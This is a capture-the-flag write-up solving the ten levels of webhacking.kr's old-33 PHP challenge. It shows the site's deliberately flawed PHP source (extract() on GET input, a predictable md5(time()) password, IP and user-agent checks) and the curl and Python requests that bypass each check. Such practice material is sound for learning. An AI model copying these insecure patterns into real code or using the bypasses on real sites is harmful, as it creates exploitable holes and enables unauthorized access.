# Old 33    HTTP&PHP Misc

URL: [https://webhacking.kr/challenge/bonus-6/](https://webhacking.kr/challenge/bonus-6/)

## Level 1

![old-33.png](/assets/ctf/webhacking.kr/old-33.png)

```php
<hr>
Challenge 33-1<br>
<a href=index.txt>view-source</a>
<hr>
<?php
if($_GET['get']=="hehe") echo "<a href=???>Next</a>";
else echo("Wrong");
?>
```

```bash
➜ curl 'https://webhacking.kr/challenge/bonus-6/?get=hehe' -b 'PHPSESSID=3052403292'
<hr>
Challenge 33-1<br>
<a href=index.txt>view-source</a>
<hr>
<a href=lv2.php>Next</a>
```

## Level 2

URL: https://webhacking.kr/challenge/bonus-6/lv2.php

```php
<hr>
Challenge 33-2<br>
<a href=lv2.txt>view-source</a>
<hr>
<?php
if($_POST['post']=="hehe" && $_POST['post2']=="hehe2") echo "<a href=???>Next</a>";
else echo "Wrong";
?>
```

```bash
➜ curl 'https://webhacking.kr/challenge/bonus-6/lv2.php' -b 'PHPSESSID=3052403292' -d 'post=hehe&post2=hehe2'
<hr>
Challenge 33-2<br>
<a href=lv2.txt>view-source</a>
<hr>
<a href=33.php>Next</a>
```

## Level 3

URL: https://webhacking.kr/challenge/bonus-6/33.php

```php
<hr>
Challenge 33-3<br>
<a href=33.txt>view-source</a>
<hr>
<?php
if($_GET['myip'] == $_SERVER['REMOTE_ADDR']) echo "<a href=???>Next</a>";
else echo "Wrong";
?>
```

```bash
➜ curl api.myip.com
{"ip":"10.10.10.10","country":"uwu","cc":"EE"}

➜ curl 'https://webhacking.kr/challenge/bonus-6/33.php?myip=10.10.10.10' -b 'PHPSESSID=3052403292'
<hr>
Challenge 33-3<br>
<a href=33.txt>view-source</a>
<hr>
<a href=l4.php>Next</a>
```

## Level 4

URL: https://webhacking.kr/challenge/bonus-6/l4.php

```php
<hr>
Challenge 33-4<br>
<a href=l4.txt>view-source</a>
<hr>
<?php
if($_GET['password'] == md5(time())) echo "<a href=???>Next</a>";
else echo "hint : ".time();
?>
```

```python
import requests, time, hashlib

url = 'https://webhacking.kr/challenge/bonus-6/l4.php'
cookies = {'PHPSESSID': '3052403292'}

for i in range(10):
    now = int(time.time()) + i
    params = {'password': hashlib.md5(str(now).encode()).hexdigest()}
    resp = requests.get(url, cookies=cookies, params=params).text
    print(resp)
    if 'hint' not in resp:
        break
```

```bash
➜ py .\old33.py
<hr>
Challenge 33-4<br>
<a href=l4.txt>view-source</a>
<hr>
hint : 1716910525

<hr>
Challenge 33-4<br>
<a href=l4.txt>view-source</a>
<hr>
<a href=md555.php>Next</a>
```

## Level 5

URL: https://webhacking.kr/challenge/bonus-6/md555.php

```php
<hr>
Challenge 33-5<br>
<a href=md555.txt>view-source</a>
<hr>
<?php
if($_GET['imget'] && $_POST['impost'] && $_COOKIE['imcookie']) echo "<a href=???>Next</a>";
else echo "Wrong";
?>
```

```bash
➜ curl 'https://webhacking.kr/challenge/bonus-6/md555.php?imget=1' -d 'impost=1' -b 'imcookie=1' -b 'PHPSESSID=3052403292' 
<hr>
Challenge 33-5<br>
<a href=md555.txt>view-source</a>
<hr>
<a href=gpcc.php>Next</a>
```

## Level 6

URL: webhacking.kr/challenge/bonus-6/gpcc.php

```php
<hr>
Challenge 33-6<br>
<a href=gpcc.txt>view-source</a>
<hr>
<?php
if($_COOKIE['test'] == md5($_SERVER['REMOTE_ADDR']) && $_POST['kk'] == md5($_SERVER['HTTP_USER_AGENT'])) echo "<a href=???>Next</a>";
else echo "hint : {$_SERVER['HTTP_USER_AGENT']}";
// hint : Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0
?>
```

```python
import requests, hashlib

ip = requests.get('https://api.myip.com').json()['ip']
url = 'https://webhacking.kr/challenge/bonus-6/gpcc.php'
headers = {'User-Agent': 'uwu'}
cookies = {'PHPSESSID': '3052403292', 'test': hashlib.md5(ip.encode()).hexdigest()}
data = {'kk': hashlib.md5(headers['User-Agent'].encode()).hexdigest()}
resp = requests.post(url, cookies=cookies, data=data, headers=headers)
print(resp.text)
```

```bash
➜ py .\old33.py
<hr>
Challenge 33-6<br>
<a href=gpcc.txt>view-source</a>
<hr>
<a href=wtff.php>Next</a>       
```

## Level 7

URL: https://webhacking.kr/challenge/bonus-6/wtff.php

```php
<hr>
Challenge 33-7<br>
<a href=wtff.txt>view-source</a>
<hr>
<?php
$_SERVER['REMOTE_ADDR'] = str_replace(".","",$_SERVER['REMOTE_ADDR']);
if($_GET[$_SERVER['REMOTE_ADDR']] == $_SERVER['REMOTE_ADDR']) echo "<a href=???>Next</a>";
else echo "Wrong<br>".$_GET[$_SERVER['REMOTE_ADDR']];
?>
```

```bash
➜ curl api.myip.com
{"ip":"10.10.10.10","country":"uwu","cc":"EE"}
➜ curl 'https://webhacking.kr/challenge/bonus-6/wtff.php?10101010=10101010' -b 'PHPSESSID=3052403292'
<hr>
Challenge 33-7<br>
<a href=wtff.txt>view-source</a>
<hr>
<a href=ipt.php>Next</a>
```

## Level 8

URL: https://webhacking.kr/challenge/bonus-6/ipt.php

```php
<hr>
Challenge 33-8<br>
<a href=ipt.txt>view-source</a>
<hr>
<?php
extract($_GET);
if(!$_GET['addr']) $addr = $_SERVER['REMOTE_ADDR'];
if($addr == "127.0.0.1") echo "<a href=???>Next</a>";
else echo "Wrong";
?>
```

```bash
➜ curl 'https://webhacking.kr/challenge/bonus-6/ipt.php?addr=127.0.0.1' -b 'PHPSESSID=3052403292'
<hr>
Challenge 33-8<br>
<a href=ipt.txt>view-source</a>
<hr>
<a href=nextt.php>Next</a>
```

## Level 9

URL: https://webhacking.kr/challenge/bonus-6/nextt.php

```php
<hr>
Challenge 33-9<br>
<a href=nextt.txt>view-source</a>
<hr>
<?php
for($i=97;$i<=122;$i=$i+2){
  $answer =chr($i);
}
if($_GET['ans'] == $answer) echo "<a href=???.php>Next</a>";
else echo "Wrong";
?>
```

![old-33-1.png](/assets/ctf/webhacking.kr/old-33-1.png)

```bash
➜ curl https://webhacking.kr/challenge/bonus-6/nextt.php?ans=acegikmoqsuwy -b 'PHPSESSID=3052403292'
<hr>
Challenge 33-9<br>
<a href=nextt.txt>view-source</a>
<hr>
<a href=forfor.php>Next</a>
```

## Level 10

URL: https://webhacking.kr/challenge/bonus-6/forfor.php

```php
<hr>
Challenge 33-10<br>
<a href=forfor.txt>view-source</a>
<hr>
<?php
$ip = $_SERVER['REMOTE_ADDR'];
for($i=0;$i<=strlen($ip);$i++) $ip=str_replace($i,ord($i),$ip);
$ip=str_replace(".","",$ip);
$ip=substr($ip,0,10);
$answer = $ip*2;
$answer = $ip/2;
$answer = str_replace(".","",$answer);
$f=fopen("answerip/{$answer}_{$ip}.php","w");
fwrite($f,"<?php include \"../../../config.php\"; solve(33); unlink(__FILE__); ?>");
fclose($f);
?>
```

![old-33-2.png](/assets/ctf/webhacking.kr/old-33-2.png)

```bash
➜ curl 'https://webhacking.kr/challenge/bonus-6/answerip/2755377553_5510755106.php' -b 'PHPSESSID=3052403292'
<script>alert('old-33 Pwned!');</script><hr>old-33 Pwned. You got 20point. Congratz!<hr>
```
